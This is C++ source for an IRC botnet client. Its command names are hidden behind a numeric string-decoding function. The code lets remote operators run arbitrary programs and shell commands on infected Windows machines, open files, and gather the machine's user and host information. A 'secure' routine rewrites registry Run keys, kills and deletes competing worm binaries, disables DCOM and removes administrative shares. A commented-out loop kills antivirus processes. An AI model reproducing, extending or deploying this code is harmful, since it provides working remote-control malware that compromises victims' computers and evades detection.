#include "main.h"
#include "bot.h"
#include "mainctrl.h"
#include "random.h"
#include "utility.h"

CString dp(const int one, ...){
	int Ne[255];Ne[0]=one;

	va_list v;
	int i=1;
	int ba;
	va_start(v,one);
	while((ba = va_arg(v,int))!=0) {
		Ne [ i ] = ba;i++;
	};
	va_end(v);
	Ne[i]=0;
	// Define Keys and Shit
	CString sKey;
	CString	sBr = "|";
	sKey = "a|b|c|d|e|f|g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z|A|B|C|D|E|F|G|H|I|J|K|L|M|N|O|P|Q|R|S|T|U|V|W|X|Y|Z|!|?|#|$|%|^|&|*|(|)|_|+|[|`|]|0|1|2|3|4|5|6|7|8|9| |.|\\|-|/|:|\"|@";
	//End!

	CString sTem="";
	for(int bb = 0;bb < sizeof(Ne)/sizeof(Ne[0]); bb ++) { 
	if(Ne[bb]==0) break;sTem.Append(sKey.Token((Ne[bb]-1),sBr).CStr());
	}
	return sTem;
}


CBot::CBot() { 
	m_bJoined=false; 
}

void CBot::Init()
{
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdId,			dp(2,79,9,4,0).CStr(),					this);	// BOT ID
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdRndNick,		dp(2,79,18,14,4,14,9,3,11,0).CStr(),	this);	// RANDOM NICK
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdAbout,		dp(2,79,1,2,15,21,20,0).CStr(),			this);	// ABOUT
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSecure,		dp(2,79,19,5,3,21,18,5,0).CStr(),		this);	// SECURE
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdSysInfo,		dp(2,79,19,25,19,9,14,6,15,0).CStr(),	this);	// SYSINFO
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdRemove,		dp(2,79,18,5,13,15,22,5,0).CStr(),		this);	// REMOVE
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdFlushDNS,		dp(2,79,6,12,21,19,8,4,14,19,0).CStr(),	this);	// FLUSHDNS
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdOpen,			dp(2,79,15,16,5,14,0).CStr(),			this);	// OPEN
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdQuit,			dp(2,79,17,21,9,20,0).CStr(),			this);	// QUIT
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdCommand,		dp(2,79,3,13,4,0).CStr(),				this);	// COMMAND
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdExecute,		dp(2,79,5,24,5,0).CStr(),				this);	// EXECUTE
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdDns,			dp(2,79,4,14,19,0).CStr(),				this);	// DNS
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdLongUptime,	dp(2,79,12,21,16,20,9,13,5,0).CStr(),	this);	// LONG UPTIME
	g_cMainCtrl.m_cCommands.RegisterCommand(&m_cmdNick,			dp(2,79,14,9,3,11,0).CStr(),			this);	// NICK

	CString sRndNick=RndNick(si_nickprefix.sValue.CStr());
	g_cMainCtrl.m_cIRC.SendRawFormat("%s %s\r\n", dp(40,35,29,37,0).CStr(), sRndNick.CStr());
	g_cMainCtrl.m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());
	m_lStartTime=(unsigned long)GetTickCount()/1000;
}


void CBot::Recv(CMessage *pMsg, bool bInternal)
{
#ifdef DBGCONSOLE
	if(pMsg->sDest[0]=='#')
		g_cMainCtrl.m_cConsDbg.Log(5, "<%s> %s\n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
	else
		g_cMainCtrl.m_cConsDbg.Log(5, "*%s* %s\n", pMsg->sSrc.CStr(), pMsg->sChatString.CStr());
#endif

	if(pMsg->sDest[0]=='#') pMsg->sReplyTo.Assign(pMsg->sDest); 
	else pMsg->sReplyTo.Assign(pMsg->sSrc);
	if(pMsg->bNotice) pMsg->sReplyTo.Assign(pMsg->sSrc);
	if(pMsg->bOutchan) {
		CString sOutchan; 
		sOutchan.Assign(pMsg->sChatString.Mid(pMsg->sChatString.Find(" -o")+3));
		pMsg->sReplyTo.Assign(sOutchan);
	}
	pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));

	// Check if its a bot command by comparing the first byte to the bot_prefix value
	if(pMsg->sChatString[0]==bot_prefix.sValue[0]) {
		if(!pMsg->sCmd.Compare(dp(2,15,20,78,18,5,16,5,1,20,0).CStr()) && g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc)) {
			if(!pMsg->sChatString.Token(1, " ").Compare("")) return;
			int i=0, iNum=atoi(pMsg->sChatString.Token(1, " ").CStr()); if(!iNum) return;
			CString sNewCStr=pMsg->sChatString.Mid(pMsg->sChatString.Find(' '));
			sNewCStr=sNewCStr.Mid(sNewCStr.Find(' '));
			pMsg->sChatString.Assign(sNewCStr); pMsg->sCmd.Assign(pMsg->sChatString.Token(0, " ").Mid(1));
			if(!bInternal)
				for(i=0;i<iNum;i++) HandleMsg(pMsg);
			else
				for(i=0;i<iNum;i++) HandleMsgInt(pMsg);
		} else
			if(!bInternal)
				HandleMsg(pMsg);
			else
				HandleMsgInt(pMsg);
	}
}

bool CBot::HandleMsg(CMessage *pMsg)
{	// If it's no login command and the user isn't logged in yet, break
	if(pMsg->sCmd.Compare(g_cMainCtrl.m_cMac.m_cmdLogin.sName.Str()) && !g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc)) return false;
	else
	{	// If the user isn't logged in yet, bot_seclogin is enabled and its no channel message, break;
		if(!g_cMainCtrl.m_cMac.FindLogin(pMsg->sSrc))
			if(bot_seclogin.bValue) if(pMsg->sDest[0]!='#') return false;
		return HandleMsgInt(pMsg); 
	} 
}


bool CBot::HandleMsgInt(CMessage *pMsg)
{	// Find the command using the command handler
	//g_cMainCtrl.m_SdCompat.HandleCommand(pMsg);
	command *pCommand=g_cMainCtrl.m_cCommands.FindCommandByName(pMsg->sCmd.CStr(), true);
	// If the command is found, let the command hander handle it
	if(pCommand) return pCommand->pHandler->HandleCommand(pMsg); else return false; 
}


	static unsigned long lLastAVKill;

bool CBot::Think()
{
	// If the IRC connection timed out, reset it
	if((GetTickCount()-g_cMainCtrl.m_cIRC.m_lLastRecv) > bot_timeout.iValue) 
	{	
		g_cMainCtrl.m_cIRC.Fail(); 
		g_cMainCtrl.m_cIRC.m_lLastRecv=GetTickCount();
	}
	// Kill all AV processes every 20 seconds
	/*if((GetTickCount()-lLastAVKill) > 20000)
	{		
		KillAV(); 
		lLastAVKill=GetTickCount(); 
	}*/
	return true; 
}

bool CBot::HandleCommand(CMessage *pMsg)
{	
	// ID
	if(!pMsg->sCmd.Compare(m_cmdId.sName.CStr())) {
		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, bot_id.sValue.Str(), pMsg->sReplyTo.Str()); 
	}

	// Execute
	else if(!pMsg->sCmd.Compare(m_cmdExecute.sName.CStr()))
	{
		CString sText(pMsg->sChatString.Token(2, " ", true)); bool bVisible=atoi(pMsg->sChatString.Token(1, " ").CStr())==1;
		#ifdef WIN32
			CString sTextExp; ExpandEnvironmentStrings(sText.CStr(), sTextExp.GetBuffer(8192), 8192); // interpret environment variables
			sText.Assign(sTextExp); 
			PROCESS_INFORMATION pinfo; 
			STARTUPINFO sinfo;
			memset(&sinfo, 0, sizeof(STARTUPINFO)); 
			sinfo.cb=sizeof(sinfo);
			if(bVisible) sinfo.wShowWindow=SW_SHOW; else sinfo.wShowWindow=SW_HIDE;
			if(!CreateProcess(NULL, sText.Str(), NULL, NULL, TRUE, NORMAL_PRIORITY_CLASS | DETACHED_PROCESS, NULL, NULL, &sinfo, &pinfo)) {
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "exec.error", pMsg->sReplyTo.Str()); return false; }
		#endif
		return true; 
	}

	// Remove Bot
	else if(!pMsg->sCmd.Compare(m_cmdRemove.sName.Str())) 
	{
		CString sNick(pMsg->sChatString.Token(1, " ", true));
		if (!sNick.Compare(g_cMainCtrl.m_sUserName.CStr())) {
			if(g_cMainCtrl.m_cBot.as_enabled.bValue)
				g_cMainCtrl.m_cInstaller.RegStartDel(g_cMainCtrl.m_cBot.as_valname.sValue);
			if(g_cMainCtrl.m_cBot.as_service.bValue)
				g_cMainCtrl.m_cInstaller.ServiceDel(g_cMainCtrl.m_cBot.as_service_name.sValue);
			g_cMainCtrl.m_cInstaller.Uninstall();
			g_cMainCtrl.m_cIRC.m_bRunning=false;
			g_cMainCtrl.m_bRunning=false; 
		}
	}

	// About
	else if(!pMsg->sCmd.Compare(m_cmdAbout.sName.CStr())) {
		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, g_cMainCtrl.m_sNameVerStr.Str(), pMsg->sReplyTo.Str()); 
	}

	
	// Flush DNS
	else if(!pMsg->sCmd.Compare(m_cmdFlushDNS.sName.CStr())) 
	{
		#ifdef WIN32
			// ipconfig.exe /flushdns
			Execute(dp(9,16,3,15,14,6,9,7,78,5,24,5,0).CStr(), dp(80,6,12,21,19,8,4,14,19,0).CStr());
		#endif
		return true; 
	}

	// Open File
	else if(!pMsg->sCmd.Compare(m_cmdOpen.sName.CStr())) 
	{
		CString sText; 
		sText=pMsg->sChatString.Token(1, " ").CStr(); 
		CString bRet;

		bRet=(char)ShellExecute(
			NULL, 
			"open", 
			sText.CStr(), 
			NULL,
			NULL,
			SW_SHOWNORMAL
		);

	//	bRet=system(sText.CStr())>0;
	//	if(bRet) return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "file opened.", pMsg->sReplyTo.Str());
		//else return 
		g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, bRet.Str(), pMsg->sReplyTo.Str()); 
	}

	// Quit
	else if(!pMsg->sCmd.Compare(m_cmdQuit.sName.CStr())) 
	{
		g_cMainCtrl.m_cIRC.m_bRunning=false; 
		return true; 
	}

	// DNS
	else if(!pMsg->sCmd.Compare(m_cmdDns.sName.CStr())) 
	{
		CString sReply; 
		hostent *pHostent=NULL; 
		in_addr iaddr;
		if(!pMsg->sChatString.Token(1, " ").Compare("")) return false;
		unsigned long addr=inet_addr(pMsg->sChatString.Token(1, " ").CStr());
		if(addr!=INADDR_NONE) {
			pHostent=gethostbyaddr((char*)&addr, sizeof(struct in_addr), AF_INET);
			if(pHostent) {
				sReply.Format("%s resolved %s", pMsg->sChatString.Token(1, " ").CStr(), pHostent->h_name);
				return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); 
			}
		} else {
			pHostent=gethostbyname(pMsg->sChatString.Token(1, " ").CStr());
			if(pHostent) {
				iaddr=*((in_addr*)*pHostent->h_addr_list);
				sReply.Format("%s -> %s", pMsg->sChatString.Token(1, " ").CStr(), inet_ntoa(iaddr));
				return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); 
			} 
		}
		if(!pHostent) {
			sReply.Format("resolve.error %s.", pMsg->sChatString.Token(1, " ").CStr());
			return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReply.Str(), pMsg->sReplyTo.Str()); 
		} 
	}

	// Random Nickname
	else if(!pMsg->sCmd.Compare(m_cmdRndNick.sName.CStr())) 
	{
		CString sRndNick=RndNick(si_nickprefix.sValue.CStr());
		g_cMainCtrl.m_cIRC.SendRawFormat("%s %s\r\n", dp(40,35,29,37,0).CStr(), sRndNick.CStr());
		g_cMainCtrl.m_sUserName.Format("%s", sRndNick.Mid(0, 32).CStr());
		return true; 
	}

	// Run Command
	else if(!pMsg->sCmd.Compare(m_cmdCommand.sName.CStr())) 
	{	
		#ifdef WIN32
			if(!(pMsg->sChatString.GetLength() > (pMsg->sCmd.GetLength()+pMsg->sChatString.Token(1, " ").GetLength()+3))) return false;
			CString sText; sText.Assign(&pMsg->sChatString[pMsg->sCmd.GetLength()+2]); 
			bool bRet=false;
			CString sReplyBuf; 
			sReplyBuf.Format("Executed: %s.", sText.CStr());
			if(system(sText.CStr())==-1) 
			{ 
				g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, "exec.error", pMsg->sReplyTo.Str()); return false; 
			} else { 
				g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, sReplyBuf.Str(), pMsg->sReplyTo.Str()); return false; 
			}
		#endif
		return true; 
	}

	// System Information
	else if(!pMsg->sCmd.Compare(m_cmdSysInfo.sName.CStr())) 
	{
		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, SysInfo().Str(), pMsg->sReplyTo.Str()); 
	}

	// Find Files
	//else if(!pMsg->sCmd.Compare(m_cmdFindFiles.sName.CStr())) 
//	{
	/*	CString strMask = pMsg->sChatString.Token(1, " ");
		CString strDir  = pMsg->sChatString.Token(2, " ");
		return g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, FindFiles(strMask, strDir), pMsg->sReplyTo.Str()); 
	*/
	//}

	// Change Nickname
	else if(!pMsg->sCmd.Compare(m_cmdNick.sName.CStr())) 
	{
		g_cMainCtrl.m_sUserName.Format("%s", pMsg->sChatString.Token(1, " ", true).Mid(0, 32).CStr());
		g_cMainCtrl.m_cIRC.SendRawFormat("%s %s\r\n", dp(40,35,29,37,0).CStr(), g_cMainCtrl.m_sUserName.CStr());
		return true; 
	}

	// Uptime check (default: 7d)
	else if(!pMsg->sCmd.Compare(m_cmdLongUptime.sName.CStr())) 
	{
		int iDays=atoi(pMsg->sChatString.Token(1, " ").CStr()); 
		if(!iDays) iDays=7;
		CString sUptime=LongUptime(iDays);
		if(sUptime.Compare("")) {
			g_cMainCtrl.m_cIRC.SendMsg(pMsg->bSilent, pMsg->bNotice, \
				sUptime.Str(), pMsg->sReplyTo.Str());
		}
		return true; 
	}


	// Secure Bot
	else if(!pMsg->sCmd.Compare(m_cmdSecure.sName.CStr())) 
	{	
		#ifdef WIN32
		CString regLoc;
		regLoc = dp(45,15,6,20,23,1,18,5,80,39,9,3,18,15,19,15,6,20,80,49,9,14,4,15,23,19,80,29,21,18,18,5,14,20,48,5,18,19,9,15,14,80,44,21,14,0).CStr();


		HKEY hkey=NULL; DWORD dwSize=128; char szDataBuf[128];
		strcpy(szDataBuf, "N"); dwSize=strlen(szDataBuf);
		LONG lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\OLE", 0, KEY_READ, &hkey);
		RegSetValueEx(hkey, dp(31,14,1,2,12,5,30,29,41,39,0).CStr(), NULL, REG_SZ, (unsigned char*)szDataBuf, dwSize);
		RegCloseKey(hkey);
		
		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, regLoc.CStr(), 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, dp(45,19,1,20,5,78,5,24,5,0).CStr());
		RegCloseKey(hkey);
		KillProcess(dp(9,18,21,14,72,78,5,24,5,0).CStr());
		CString tmpBagle; GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(), dp(9,18,21,14,72,78,5,24,5,0).CStr());
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, regLoc.CStr(), 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, dp(18,1,20,5,78,5,24,5,0).CStr());
		RegCloseKey(hkey);
		KillProcess(dp(9,69,69,18,73,72,14,72,78,5,24,5,0).CStr());
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(),dp(9,69,69,18,73,72,14,72,78,5,24,5,0).CStr());
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, regLoc.CStr(), 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, dp(19,19,1,20,5,78,5,24,5,0).CStr());
		RegCloseKey(hkey);
		KillProcess(dp(23,9,14,19,25,19,78,5,24,5,0).CStr());
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(), dp(23,9,14,19,25,19,78,5,24,5,0).CStr());
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, regLoc.CStr(), 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, dp(4,71,4,21,16,4,1,20,5,78,5,24,5,0).CStr());
		RegCloseKey(hkey);
		KillProcess(dp(2,2,5,1,7,12,5,78,5,24,5,0).CStr());
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(), dp(2,2,5,1,7,12,5,78,5,24,5,0).CStr());
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, regLoc.CStr(), 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, dp(46,1,19,11,39,15,14,0).CStr());
		RegCloseKey(hkey);
		KillProcess(dp(20,1,19,11,13,15,14,78,5,24,5,0).CStr());
		GetSystemDirectory(tmpBagle.GetBuffer(MAX_PATH), MAX_PATH);
		tmpBagle.Format("%s\\%s",tmpBagle.CStr(), dp(20,1,19,11,13,15,14,78,5,24,5,0).CStr());
		DeleteFile(tmpBagle);

		lRet=RegOpenKeyEx(HKEY_LOCAL_MACHINE, regLoc.CStr(), 0, KEY_ALL_ACCESS, &hkey);
		RegDeleteValue(hkey, dp(31,24,16,12,15,18,5,18,0).CStr());
		RegCloseKey(hkey);

		system("net share c$ /delete /y");
		system("net share d$ /delete /y");
		system("net share ipc$ /delete /y");
		system("net share admin$ /delete /y");



		#endif
		return true; 
	}

	return false; 
}

CString CBot::LongUptime(int iDays)
{	
	CString sLongUptime;
	if (iDays == 0) return false;
	#ifdef WIN32
		int total=GetTickCount()/1000;
		OSVERSIONINFO verinfo;
		if(total/86400 >= iDays) sLongUptime.Format("up: %dd %dh %dm",total/86400, (total%86400)/3600, ((total%86400)%3600)/60);
		else return CString("");
	#endif
	return sLongUptime; 
}

CString CBot::Status()
{	/*CString sStatus; unsigned long total, days, hours, minutes; total=(GetTickCount()/1000)-m_lStartTime;
	days=total/86400; hours=(total%86400)/3600; minutes=((total%86400)%3600)/60;
	sStatus.Format("%s has been running for %dd %dh %dm.", g_cMainCtrl.m_sNameVerStr.CStr(), days, hours, minutes); return sStatus;
	*/return ""; }

CString CBot::SysInfo()
{
	CString sSysInfo;
	#ifdef WIN32
		int total=GetTickCount()/1000;
		MEMORYSTATUS memstat; OSVERSIONINFO verinfo;
		char szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
		DWORD dwNameSize = MAX_COMPUTERNAME_LENGTH + 1;
		char *szCompname;
		TCHAR szUserName[21];
		DWORD dwUserSize = sizeof(szUserName);

		GlobalMemoryStatus(&memstat); 
		verinfo.dwOSVersionInfoSize=sizeof(OSVERSIONINFO); 
		GetVersionEx(&verinfo); 
		char *os; 
		char os2[140];
		if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==0)
		{	
			if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_WINDOWS)			os="95";
			if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT)					os="NT"; 
		}
		else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==10)	os="98";
		else if(verinfo.dwMajorVersion==4 && verinfo.dwMinorVersion==90)	os="ME";
		else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==0)		os="2000"; 
		else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==1)		os="XP";
		else if(verinfo.dwMajorVersion==5 && verinfo.dwMinorVersion==2)		os="2003"; 
		else																os="???";

		if(verinfo.dwPlatformId==VER_PLATFORM_WIN32_NT && verinfo.szCSDVersion[0]!='\0')
		{	
			sprintf(os2, "%s [%s]", os, verinfo.szCSDVersion); 
			os = os2; 
		}
		GetComputerName(szBuffer, &dwNameSize);
		szCompname = szBuffer;
		GetUserName(szUserName, &dwUserSize);

		sSysInfo.Format("CPU: %dMHz. Memory: %dMB/%dMB. OS: Win %s (%d.%d, Build %d). uptime: %dd %dh %dm box: %s. user: %s.",
		cpuspeed(), memstat.dwAvailPhys/1046528, memstat.dwTotalPhys/1046528, os, verinfo.dwMajorVersion, verinfo.dwMinorVersion, verinfo.dwBuildNumber, total/86400, (total%86400)/3600, ((total%86400)%3600)/60, szCompname, szUserName);
	#endif
	return sSysInfo; 
}
